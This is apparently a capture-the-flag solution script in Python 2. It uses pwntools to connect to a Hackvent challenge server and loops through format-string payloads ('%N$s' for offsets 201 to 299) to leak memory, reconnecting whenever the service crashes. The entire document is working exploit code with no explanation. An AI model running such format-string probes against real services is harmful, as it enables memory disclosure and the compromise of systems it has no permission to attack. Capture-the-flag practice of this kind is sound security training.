#!/usr/bin/python2

from pwn import *

r = remote('challenges.hackvent.hacking-lab.com', 1033)
trash = r.recvuntil("> ")
for i in range(201, 300):
	try:
		r.sendline("1")
		r.sendline("%" + str(i) + "$s")
		result = r.recvuntil("> ")
		print(str(i) + "\n=====\n" + result)
	except EOFError:
		r = remote('challenges.hackvent.hacking-lab.com', 1033)
		trash = r.recvuntil("> ")
